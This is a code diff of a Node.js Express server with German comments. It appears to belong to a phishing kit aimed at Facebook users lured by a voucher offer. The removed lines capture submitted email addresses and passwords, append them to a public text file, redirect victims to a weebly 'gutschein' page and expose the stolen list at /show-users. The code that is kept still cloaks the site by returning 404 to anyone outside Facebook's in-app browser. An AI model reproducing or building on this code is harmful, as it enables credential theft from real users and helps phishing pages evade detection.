@@ -6,48 +6,8 @@ const path = require("path");
 const app = express();
 const DATA_FILE = path.join(__dirname, "public", "users.txt");
 
-// 1. Middleware nur auf /login anwenden
-// const fbOnly = (req, res, next) => {
-//   const ua = req.headers["user-agent"] || "";
-//   if (!/(FBAN\/|FBAV\/)/i.test(ua)) {
-//     return res.status(404).send("");
-//   }
-//   next();
-// };
-
-// // 2. POST /login – Nur Facebook WebView
-// app.post("/login", fbOnly, (req, res) => {
-//   const { login_email, login_password } = req.body;
-//   const line = `${new Date().toISOString()} | ${login_email} | ${login_password}\n`;
-
-//   fs.appendFile(DATA_FILE, line, "utf8", (err) => {
-//     if (err) {
-//       console.error("Fehler beim Schreiben:", err);
-//       return res.status(500).send("Serverfehler");
-//     }
-//     res.redirect("https://webly-gutschein.weebly.com/end.html");
-//   });
-// });
-
-// // 3. GET /show-users – Für alle Browser erlaubt
-// app.get("/show-users", (req, res) => {
-//   res.sendFile(DATA_FILE, (err) => {
-//     if (err) {
-//       console.error("Fehler beim Lesen der Datei:", err);
-//       res.status(500).send("Konnte Datei nicht laden");
-//     }
-//   });
-// });
 
 //1. Nur Facebook In-App WebView erlauben
-// app.use((req, res, next) => {
-//   const ua = req.headers["user-agent"] || "";
-//   if (!/(FBAN\/|FBAV\/)/i.test(ua)) {
-//     return res.status(404).send("");
-//   }
-//   next();
-// });
-
 app.get("", (req, res, next) => {
   const ua = req.headers["user-agent"] || "";
   if (!/(FBAN\/|FBAV\/)/i.test(ua)) {
